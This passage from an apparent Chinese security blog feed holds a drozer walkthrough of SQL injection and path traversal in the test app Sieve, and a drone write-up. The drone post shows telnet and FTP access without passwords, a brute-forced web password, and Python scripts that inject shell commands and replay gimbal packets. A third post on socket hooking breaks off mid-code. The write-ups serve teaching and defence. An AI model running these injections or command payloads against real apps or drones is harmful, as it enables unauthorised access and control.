class="comment">//从ContentProvider中获取数据；</span></span><br></pre></td></tr></table></figure><p>Android中Content Provider起到在不同的进程App之间实现共享数据的作用，通过Binder进程间通信机制以及匿名共享内存机制来实现，但是考虑到数据的安全性，我们需要设置一定的保护权限。Binder进程间通信机制突破了以应用程序为边界的权限控制，是安全可控的，数据的访问接口由数据的所有者来提供，数据提供方实现安全控制，决定数据的读写操作。而Content Provider组件本身提供了读取权限控制，这导致在使用过程中就会存在一些漏洞。</p><img src="/posts/3ea91662/5.1.1.png" class=""><h2 id="5-1-信息泄露"><a href="#5-1-信息泄露" class="headerlink" title="5.1 信息泄露"></a>5.1 信息泄露</h2><h3 id="5-1-1-原理介绍"><a href="#5-1-1-原理介绍" class="headerlink" title="5.1.1 原理介绍"></a>5.1.1 原理介绍</h3><p>Content URI是一个标志provider中的数据的URI。Content URI中包含了整个provider的以符号表示的名字(它的authority)和指向一个表的名字(一个路径)。当你调用一个客户端的方法来操作一个provider中的一个表，指向表的Content URI是参数之一，如果对ContentProvider的权限没有做好控制，就有可能导致恶意的程序通过这种方式读取App的敏感数据。</p><h3 id="5-1-2-漏洞复现"><a href="#5-1-2-漏洞复现" class="headerlink" title="5.1.2 漏洞复现"></a>5.1.2 漏洞复现</h3><p>查看针对 provider 数据组件具体的攻击面：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.provider.info -a com.mwr.example.sieve</span><br></pre></td></tr></table></figure><img src="/posts/3ea91662/5.1.2.png" class=""><p>列出并扫描APK的所有URI：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run app.provider.finduri com.mwr.example.sieve</span><br><span class="line">run scanner.provider.finduris -a com.mwr.example.sieve</span><br></pre></td></tr></table></figure><p>却发现报错：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">dz&gt; run scanner.provider.finduris -a com.mwr.example.sieve</span><br><span class="line">Scanning com.mwr.example.sieve...</span><br><span class="line">C:\Program Files\Java\jdk1.8.0_341\bin\javac.exe -cp C:\Python27\lib\site-packages\drozer\lib\android.jar ZipUtil.java</span><br><span class="line">C:\Python27\lib\site-packages\drozer\lib\dx.bat --dex --output e6b772d6bca864c2997c1de7498de91f.apk ZipUtil.class</span><br><span class="line"></span><br><span class="line">UNEXPECTED TOP-LEVEL EXCEPTION:</span><br><span class="line">com.android.dx.cf.iface.ParseException: bad class file magic (cafebabe) or version (0034.0000)</span><br><span class="line">        at com.android.dx.cf.direct.DirectClassFile.parse0(DirectClassFile.java:472)</span><br><span class="line">        at com.android.dx.cf.direct.DirectClassFile.parse(DirectClassFile.java:406)</span><br><span class="line">        at com.android.dx.cf.direct.DirectClassFile.parseToInterfacesIfNecessary(DirectClassFile.java:388)</span><br><span class="line">        at com.android.dx.cf.direct.DirectClassFile.getMagic(DirectClassFile.java:251)</span><br><span class="line">        at com.android.dx.command.dexer.Main.processClass(Main.java:665)</span><br><span class="line">        at com.android.dx.command.dexer.Main.processFileBytes(Main.java:634)</span><br><span class="line">        at com.android.dx.command.dexer.Main.access$600(Main.java:78)</span><br><span class="line">        at com.android.dx.command.dexer.Main$1.processFileBytes(Main.java:572)</span><br><span class="line">        at com.android.dx.cf.direct.ClassPathOpener.processOne(ClassPathOpener.java:170)</span><br><span class="line">        at com.android.dx.cf.direct.ClassPathOpener.process(ClassPathOpener.java:144)</span><br><span class="line">        at com.android.dx.command.dexer.Main.processOne(Main.java:596)</span><br><span class="line">        at com.android.dx.command.dexer.Main.processAllFiles(Main.java:498)</span><br><span class="line">        at com.android.dx.command.dexer.Main.runMonoDex(Main.java:264)</span><br><span class="line">        at com.android.dx.command.dexer.Main.run(Main.java:230)</span><br><span class="line">        at com.android.dx.command.dexer.Main.main(Main.java:199)</span><br><span class="line">        at com.android.dx.command.Main.main(Main.java:103)</span><br><span class="line">...while parsing ZipUtil.class</span><br><span class="line"></span><br><span class="line">1 error; aborting</span><br><span class="line">drozer could not find or compile a required extension library.</span><br><span class="line"></span><br><span class="line">dz&gt;</span><br></pre></td></tr></table></figure><p>根据错误提示，<code>ZipUtil.class</code>文件的魔数或者版本号错了。这其实是JDK版本兼容性问题。我们使用的是jdk 1.8将<code>ZipUtil.java</code>编译成<code>ZipUtil.class</code>，再使用<code>dx.bat</code>批处理脚本中的<code>dx.jar</code>将<code>ZipUtil.class</code>编译成DEX文件。查看该<code>dx.jar</code>的编译环境为0x31，对应JDK版本为1.5；而<code>ZipUtil.class</code>的编译环境为0x34，对应JDK版本为1.8，不能向上兼容。</p><p>查看jar包编译环境：<a href="https://blog.csdn.net/ecjtuhq/article/details/53771441">https://blog.csdn.net/ecjtuhq/article/details/53771441</a></p><p>由于从Android-sdk\build-tools的不同版本中找到<code>dx.jar</code>的编译环境最高为0x33，也就是jdk 1.7。1.8及以后由<code>d8.jar</code>代替<code>dx.jar</code>编译DEX文件，所以不能通过替换<code>dx.jar</code>解决这个问题，我们干脆将Java环境切换为jdk 1.5就好。</p><p>再次执行命令没有问题：</p><img src="/posts/3ea91662/5.1.4.png" class=""><p>查看可访问 URI 内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Keys/</span><br></pre></td></tr></table></figure><img src="/posts/3ea91662/5.1.5.png" class=""><p>列出可访问URI的所有表名：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run scanner.provider.sqltables -a  com.mwr.example.sieve</span><br></pre></td></tr></table></figure><img src="/posts/3ea91662/5.2.1.png" class=""><h3 id="5-1-3-防护策略"><a href="#5-1-3-防护策略" class="headerlink" title="5.1.3 防护策略"></a>5.1.3 防护策略</h3><p>（1）minSdkVersion不低于9</p><p>（2）不向外部App提供数据的私有content provider显示设置exported=”false”，避免组件暴露(编译api小于17时更应注意此点)</p><p>（3）内部App通过content provider交换数据时，设置protectionLevel=”signature”验证签名</p><p>（4）公开的content provider确保不存储敏感数据</p><h2 id="5-2-SQL注入漏洞"><a href="#5-2-SQL注入漏洞" class="headerlink" title="5.2 SQL注入漏洞"></a>5.2 SQL注入漏洞</h2><h3 id="5-2-1-原理介绍"><a href="#5-2-1-原理介绍" class="headerlink" title="5.2.1 原理介绍"></a>5.2.1 原理介绍</h3><p>对Content Provider进行增删改查操作时，程序没有对用户的输入进行过滤，未采用参数化查询的方式，可能会导致SQL注入攻击。</p><p>所谓的SQL注入攻击指的是攻击者可以精心构造selection参数、projection参数以及其他有效的SQL语句组成部分，实现在未授权的情况下从Content Provider获取更多信息。应该避免使用<code>SQLiteDatabase.rawQuery()</code>进行查询，而应该使用编译好的参数化语句。使用预编译好的语句比如SQLiteStatement，不仅可以避免SQL注入，而且操作性能也大幅提高，因为其不用每次执行都进行解析。</p><p>另外一种方式是使用<code>query()</code>、<code>insert()</code>、<code>update()</code>和<code>delete()</code>方法，因为这些函数也提供了参数化的语句。预编译的参数化语句，问号处可以插入或者使<code>bindString()</code>绑定值，从而避免SQL注入攻击。</p><h3 id="5-2-2-漏洞复现"><a href="#5-2-2-漏洞复现" class="headerlink" title="5.2.2 漏洞复现"></a>5.2.2 漏洞复现</h3><p>drozer 提供了扫描模块，列出可被projection和selection的provider：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run scanner.provider.injection -a com.mwr.example.sieve</span><br></pre></td></tr></table></figure><img src="/posts/3ea91662/5.1.7.png" class=""><p>测试可访问 URI 是否存在注入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection &quot;&#x27;&quot;</span><br><span class="line">或</span><br><span class="line">run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --selection &quot;&#x27;&quot;</span><br></pre></td></tr></table></figure><img src="/posts/3ea91662/5.1.6.png" class=""><p>关于projection选项与selection选项的区别：projection是预测有哪些字段，并取得该字段的所有值；selection更像是过滤，筛选出需要的记录。</p><p>根据注入结果可以猜测查询语句为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">--projection &quot;&#x27;&quot;</span><br><span class="line">SELECT &#x27; FROM Passwords</span><br><span class="line">--projection &quot;username&quot;</span><br><span class="line">SELECT username FROM Passwords</span><br><span class="line"></span><br><span class="line">--selection &quot;&#x27;&quot;</span><br><span class="line">SELECT * FROM Passwords WHERE (&#x27;)</span><br><span class="line">--selection &quot;service = 555&quot;</span><br><span class="line">SELECT * FROM Passwords WHERE (service = 555)</span><br><span class="line">--selection &quot;1=1&quot;</span><br><span class="line">SELECT * FROM Passwords WHERE (1=1)</span><br></pre></td></tr></table></figure><p>既然可以注入，当然不局限于当前的数据库(DBContentProvider)或表(Passwords)，我们可以注入出当前数据库的所有数据表：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection &quot;* FROM SQLITE_MASTER WHERE type=&#x27;table&#x27;;--&quot;</span><br><span class="line"></span><br><span class="line">构造得到的查询语句为：</span><br><span class="line">SELECT * FROM SQLITE_MASTER WHERE type=&#x27;table&#x27;;-- FROM Passwords</span><br><span class="line">意为查看当前数据库，所有类型为&#x27;table&#x27;的结构信息</span><br></pre></td></tr></table></figure><p>查询某个表中所有数据：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection &quot;* FROM Key;--&quot;</span><br></pre></td></tr></table></figure><img src="/posts/3ea91662/5.1.8.png" class=""><h3 id="5-2-3-防护策略"><a href="#5-2-3-防护策略" class="headerlink" title="5.2.3 防护策略"></a>5.2.3 防护策略</h3><p>（1）实现健壮的服务端校验</p><p>（2）使用参数化查询语句，比如SQLiteStatement</p><p>（3）避免使用<code>rawQuery()</code></p><p>（4）过滤用户的输入</p><h2 id="5-3-目录遍历漏洞"><a href="#5-3-目录遍历漏洞" class="headerlink" title="5.3 目录遍历漏洞"></a>5.3 目录遍历漏洞</h2><h3 id="5-3-1-原理介绍"><a href="#5-3-1-原理介绍" class="headerlink" title="5.3.1 原理介绍"></a>5.3.1 原理介绍</h3><p>Android Content Provider存在文件目录遍历安全漏洞，该漏洞源于对外暴露Content Provider组件的应用，没有对Content Provider组件的访问进行权限控制和对访问的目标文件的Content Query Uri进行有效判断，攻击者利用该应用暴露的Content Provider的<code>openFile()</code>接口进行文件目录遍历以达到访问任意可读文件的目的。</p><h3 id="5-3-2-漏洞复现"><a href="#5-3-2-漏洞复现" class="headerlink" title="5.3.2 漏洞复现"></a>5.3.2 漏洞复现</h3><p>前面测试了存在注入的 URI，由于 provider 还提供文件访问，于是可以探测目录穿越：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run scanner.provider.traversal -a com.mwr.example.sieve</span><br></pre></td></tr></table></figure><p>从下图可知可以利用<code>content://com.mwr.example.sieve.FileBackupProvider/</code>进行目录穿越。比如穿越到手机终端的<code>/etc</code>目录读<code>hosts</code>系统文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts</span><br></pre></td></tr></table></figure><img src="/posts/3ea91662/5.1.9.png" class=""><p>也可以根据 <code>run app.package.info -a com.mwr.example.sieve</code> 得到的目录信息获取更多文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/data/user/0/com.mwr.example.sieve/databases/database.db</span><br></pre></td></tr></table></figure><p>下载数据库文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.provider.download content://com.mwr.example.sieve.FileBackupProvider/data/user/0/com.mwr.example.sieve/databases/database.db C:\\Users\\dell\\Desktop\\database.db</span><br></pre></td></tr></table></figure><img src="/posts/3ea91662/5.1.10.png" class=""><p>使用DB Browser for SQLite工具打开<code>.db</code>文件，可以查看里面的数据信息。</p><img src="/posts/3ea91662/5.1.11.png" class=""><h3 id="5-3-3-防护策略"><a href="#5-3-3-防护策略" class="headerlink" title="5.3.3 防护策略"></a>5.3.3 防护策略</h3><p>（1）将不必要导出的Content Provider设置为不导出</p><p>（2）去除没有必要的<code>openFile()</code>接口</p><p>（3）过滤限制跨域访问，对访问的目标文件的路径进行有效判断</p><p>（4）设置权限来进行内部应用通过Content Provider的数据共享</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;学习参考文章：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/wjrblogs/p/13953761.html&quot;&gt;Drozer 测试 APP - Sieve&amp;amp;FourGoats &lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/WindXaa&quot;&gt;WindXaa&lt;/a&gt;/&lt;a href=&quot;https://github.com/WindXaa/Android-Vulnerability-Mining&quot;&gt;Android-Vulnerability-Mining&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://ayesawyer.github.io/2019/08/21/Android-App%E5%B8%B8%E8%A7%81%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/&quot;&gt;Android App常见安全漏洞&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Android安全" scheme="http://example.com/categories/Android%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>无人机漏洞挖掘学习</title>
    <link href="http://example.com/posts/8a5081f6.html"/>
    <id>http://example.com/posts/8a5081f6.html</id>
    <published>2022-10-15T02:24:12.525Z</published>
    <updated>2022-11-17T06:35:28.751Z</updated>
    
    <content type="html"><![CDATA[<p>跟着大佬学习下漏洞挖掘。</p><span id="more"></span><p>已知无人机开机时会开启一个热点，将电脑连上这个热点，此时就与无人机在同一个局域网内。得到该局域网的IP后，通过nmap分别查看无人机和遥控器开启了哪些端口。</p><p>无人机开启了ftp和telnet服务，而遥控器开启了telnet和http服务。</p><img src="/posts/8a5081f6/8.1.1.jpg" class=""><h1 id="1-telnet空口令漏洞"><a href="#1-telnet空口令漏洞" class="headerlink" title="1. telnet空口令漏洞"></a>1. telnet空口令漏洞</h1><p>尝试使用telnet远程登录无人机和遥控器的内部系统。无人机系统存在空口令，所以一下子就可以拿到最高权限了。遥控器使用root用户登录，也可拿到最高权限。</p><img src="/posts/8a5081f6/8.1.2.jpg" class=""><h1 id="2-遥控器-Web管理服务弱口令"><a href="#2-遥控器-Web管理服务弱口令" class="headerlink" title="2. 遥控器 Web管理服务弱口令"></a>2. 遥控器 Web管理服务弱口令</h1><p>遥控器开放了http服务，用浏览器访问遥控器IP地址(电脑与遥控器处在同一局域网内)，出现了一个路由器登录页面，需要登录密码。尝试使用BurpSuite抓包对密码进行暴力破解。</p><img src="/posts/8a5081f6/8.1.3.png" class=""><img src="/posts/8a5081f6/2.1.1.png" class=""><p>拿出收藏多年的暴破字典，发现口令为“12345678”的报文长度与众不同，尝试使用该口令进行登录，成功登入。</p><img src="/posts/8a5081f6/2.1.2.png" class=""><img src="/posts/8a5081f6/2.1.3.png" class=""><h1 id="3-遥控器-Web管理服务未授权重置密码漏洞"><a href="#3-遥控器-Web管理服务未授权重置密码漏洞" class="headerlink" title="3. 遥控器 Web管理服务未授权重置密码漏洞"></a>3. 遥控器 Web管理服务未授权重置密码漏洞</h1><p>登入路由器管理页面后，尝试在系统设置中修改管理密码，抓包发现重置后的新密码。</p><img src="/posts/8a5081f6/2.1.4.png" class=""><img src="/posts/8a5081f6/2.1.5.png" class=""><p>这时我们可以直接修改抓包中的密码，并且密码长度、字符不受限制。</p><img src="/posts/8a5081f6/2.1.6.png" class=""><p>使用修改的密码进行登录成功登入。</p><h1 id="4-遥控器-Web管理服务危险接口暴露"><a href="#4-遥控器-Web管理服务危险接口暴露" class="headerlink" title="4. 遥控器 Web管理服务危险接口暴露"></a>4. 遥控器 Web管理服务危险接口暴露</h1><p>在抓包过程中，发现它的路径都有那么点意思。在<code>goform</code>目录下有<code>fromRootLogin</code>(root登录)、<code>set_manpwd</code>(重置密码)等，或许可以找到其它有用的路径。一种方法是暴破，但这几率很低；另一种是分析遥控器内部的程序。</p><p>进入遥控器终端的<code>/bin</code>目录，它主要是放置系统的必备执行文件。发现里面有<code>boa</code>程序，它是一个开源的Web服务器。在<code>/bin</code>目录下也发现了<code>tftp</code>程序，是一个简单文件传输工具，可以用它将<code>boa</code>程序上传到电脑，以便分析。在使用<code>tftp</code>前，需要在电脑安装<code>tftp</code>服务器。具体可看：<a href="https://blog.csdn.net/m0_45463480/article/details/124550320">https://blog.csdn.net/m0_45463480/article/details/124550320</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tftp 172.16.10.20 -pr boa</span><br></pre></td></tr></table></figure><p>将它拿去IDA逆向分析，顺着<code>main()</code>函数一个个看下去会发现很多有关Web网页之类的路径。</p><img src="/posts/8a5081f6/4.1.1.png" class=""><img src="/posts/8a5081f6/4.1.2.png" class=""><img src="/posts/8a5081f6/4.1.3.png" class=""><p>尝试在浏览器中输入某条路径，验证是否可行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">172.16.10.10/goform/get_wifi_info</span><br></pre></td></tr></table></figure><img src="/posts/8a5081f6/4.1.4.png" class=""><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">172.16.10.10/goform/get_manpwd_info</span><br></pre></td></tr></table></figure><img src="/posts/8a5081f6/4.1.5.png" class=""><h1 id="5-无人机-TCP-8021端口-FTP服务未授权访问漏洞"><a href="#5-无人机-TCP-8021端口-FTP服务未授权访问漏洞" class="headerlink" title="5. 无人机 TCP 8021端口 FTP服务未授权访问漏洞"></a>5. 无人机 TCP 8021端口 FTP服务未授权访问漏洞</h1><p>无人机开放了ftp服务，可以通过ftp传输文件。先去<code>/bin</code>目录下看有哪些命令可以被执行。</p><p>有netstat，可以查看无人机开放了哪些端口。</p><img src="/posts/8a5081f6/5.1.1.png" class=""><p>有ftpget和ftpput，可以用来传输文件，ftp需要用户名和密码，否则会登录失败。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">下载</span><br><span class="line">ftpget -u zyx -p 123456  192.168.1.156  hello</span><br><span class="line"></span><br><span class="line">上传</span><br><span class="line">ftpput -u zyx -p 123456  192.168.1.156  hello</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fh-linux# ftpput 172.16.10.21 vs_play </span><br><span class="line">ftpput: unexpected server response to PASS: 530 Login incorrect.</span><br></pre></td></tr></table></figure><p>ftp的用户名和密码可以通过Wireshark抓包来获取。</p><p>查看App中哪里用到了ftp服务：</p><img src="/posts/8a5081f6/5.1.2.png" class=""><p>发现无人机的IP与端口8021，结合代码分析，这个端口很有可能是专门用来传输照片和视频的，使用ftp传输。</p><img src="/posts/8a5081f6/5.1.4.png" class=""><p>在文件夹路径中输入：ftp://172.16.10.1:8021，无需用户密码即可登入无人机系统的某层目录(<code>/sdcard</code>)。上面的“picture”和“video”指的应该就是存放照片或视频的目录。</p><img src="/posts/8a5081f6/5.1.5.png" class=""><h1 id="6-无人机-TCP-8888端口-命令注入漏洞"><a href="#6-无人机-TCP-8888端口-命令注入漏洞" class="headerlink" title="6. 无人机 TCP 8888端口 命令注入漏洞"></a>6. 无人机 TCP 8888端口 命令注入漏洞</h1><p>通过抓包可知无人机端口8888用于与App和遥控器进行TCP通信，8080进行UDP通信。在无人机终端中，哪个才是无人机的主要运行程序呢？</p><p>查看终端目录，在千篇一律的Linux目录下发现一个特殊的目录：app。</p><img src="/posts/8a5081f6/6.1.1.png" class=""><p>里面有非常多的配置文件和HEX文件，除此之外，还有一些可执行文件，哪个是我们想要的无人机可执行程序呢？按理说，肯定是最大的那个，要不然也装不下那么多功能。所以<code>vs_play</code>就很可疑。</p><p>由于使用ftp是不可行了，但它还有个tftp工具可用，同4操作即可。</p><p>载入IDA，查看有哪些导入函数可以利用，可以看到调用了一个危险函数<code>system()</code>，如果能成功利用的话就可以入侵无人机终端。</p><img src="/posts/8a5081f6/6.1.2.png" class=""><p>目前来说只能利用收发UDP/TCP包来修改数据，在众多调用<code>system()</code>函数当中，如果刚好有利用到UDP/TCP包中数据的内容，或许就可以构造POC来入侵系统。</p><img src="/posts/8a5081f6/5.1.3.png" class=""><p>发现这里的<code>system()</code>函数传入的是可变参数，参数是从&amp;v101[v12]内存块中复制过来的最多29个字节。</p><img src="/posts/8a5081f6/6.1.3.png" class=""><p>继续往上看，分析分析：</p><img src="/posts/8a5081f6/6.1.4.png" class=""><img src="/posts/8a5081f6/6.1.5.png" class=""><img src="/posts/8a5081f6/6.1.6.png" class=""><img src="/posts/8a5081f6/6.1.7.png" class=""><p>所以就可以构造发包，间接对终端执行命令。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;da;&#x27;</span></span><br><span class="line">cmd = <span class="string">b&#x27;echo 123 &gt; /tmp/1.txt;&#x27;</span></span><br><span class="line">payload += cmd</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">&#x27;172.16.10.1&#x27;</span>,<span class="number">8888</span>))</span><br><span class="line">s.send(payload)</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure><img src="/posts/8a5081f6/6.1.8.png" class=""><h1 id="7-无人机-TCP-8888端口-UDP-8080端口-重放漏洞"><a href="#7-无人机-TCP-8888端口-UDP-8080端口-重放漏洞" class="headerlink" title="7. 无人机 TCP 8888端口 / UDP 8080端口 重放漏洞"></a>7. 无人机 TCP 8888端口 / UDP 8080端口 重放漏洞</h1><h2 id="7-1-TCP-8888端口-重放漏洞"><a href="#7-1-TCP-8888端口-重放漏洞" class="headerlink" title="7.1 TCP 8888端口 重放漏洞"></a>7.1 TCP 8888端口 重放漏洞</h2><p><a href="https://v5le0n9.github.io/posts/ac4cb042.html#6-1-2-%E4%BA%91%E5%8F%B0%E8%A7%92%E5%BA%A6%E8%B0%83%E8%8A%82">SJ F PRO v2.4.5无人机App分析 6.1.2 云台角度调节</a></p><h2 id="7-2-UDP-8080端口-重放漏洞"><a href="#7-2-UDP-8080端口-重放漏洞" class="headerlink" title="7.2 UDP 8080端口 重放漏洞"></a>7.2 UDP 8080端口 重放漏洞</h2><p>与7.1同样方法，也是可以找到一个云台角度调节的包。</p><img src="/posts/8a5081f6/7.2.1.png" class=""><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> hexlify, unhexlify</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;ff535410&quot;</span> + <span class="string">&quot;80&quot;</span> + <span class="string">&quot;8a&quot;</span>  <span class="comment"># 云台水平和垂直角度 </span></span><br><span class="line">payload = unhexlify(payload)</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">s.connect((<span class="string">&#x27;172.16.10.1&#x27;</span>, <span class="number">8080</span>))</span><br><span class="line">s.send(payload)</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;跟着大佬学习下漏洞挖掘。&lt;/p&gt;</summary>
    
    
    
    <category term="Android安全" scheme="http://example.com/categories/Android%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="漏洞挖掘" scheme="http://example.com/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
  </entry>
  
  <entry>
    <title>网络通信协议分析</title>
    <link href="http://example.com/posts/bdcbf47.html"/>
    <id>http://example.com/posts/bdcbf47.html</id>
    <published>2022-09-21T09:25:01.735Z</published>
    <updated>2022-11-17T06:26:02.970Z</updated>
    
    <content type="html"><![CDATA[<p>要解决的问题：</p><p>如何对自定义协议进行逆向分析？</p><p>发送参数被加密，如何快速完成参数处理流程的定位？</p><p>加密算法复杂，如何主动调用完成对数据包的处理和重放？</p><span id="more"></span><img src="/posts/bdcbf47/1.1.1.png" class=""><p>逆向分析思想：</p><p>堆栈回溯思想：Java层、JNI层</p><p>控制流分析与数据流分析相结合思想</p><p>关键字符串、关键API定位思想</p><h1 id="1-Java层Socket抓包"><a href="#1-Java层Socket抓包" class="headerlink" title="1. Java层Socket抓包"></a>1. Java层Socket抓包</h1><p>在Socket通信过程中，Android系统框架层到底有哪些API参与到建立连接发送数据当中去呢？又是在Java层利用哪些API来完成对数据的抓取？</p><h2 id="1-1-TCP"><a href="#1-1-TCP" class="headerlink" title="1.1 TCP"></a>1.1 TCP</h2><p>追踪安卓源码分析：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">java.net.Socket类构造函数：new Socket(ip, port)-&gt;</span><br><span class="line">Socket(InetAddress[] addresses, int port, SocketAddress localAddr, boolean stream)-&gt;</span><br><span class="line">impl-&gt;java.net.SocksSocketImpl</span><br><span class="line"></span><br><span class="line">建立连接：connect(SocketAddress endpoint)</span><br><span class="line"></span><br><span class="line">接收数据：java.net.SocketInputStream.read(byte[])-&gt;</span><br><span class="line">read(b, 0, b.length)-&gt;</span><br><span class="line">read(b, off, length, impl.getTimeout())-&gt;</span><br><span class="line">socketRead(fd, b, off, length, timeout)-&gt;</span><br><span class="line">socketRead0(fd, b, off, length, timeout)(jni函数)</span><br><span class="line">    </span><br><span class="line">发送数据：java.net.SocketOutputStream.write(byte[])-&gt;</span><br><span class="line">socketWrite(b, 0, b.length)-&gt;</span><br><span class="line">socketWrite0(fd, b, off, len)(jni函数)</span><br></pre></td></tr></table></figure><p>我们可以hook这些API来得到发送和接收原始的数据包。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span 